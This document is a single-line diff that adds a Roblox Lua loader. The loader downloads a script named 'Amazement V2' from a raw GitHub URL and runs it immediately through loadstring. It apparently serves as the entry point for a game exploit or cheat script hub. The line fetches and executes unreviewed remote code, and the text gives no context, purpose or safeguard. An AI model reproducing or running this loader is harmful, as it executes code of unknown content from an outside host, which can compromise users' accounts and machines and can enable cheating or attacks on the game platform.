@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/followz/Amazement/main/Amazement%20V2'),true))()
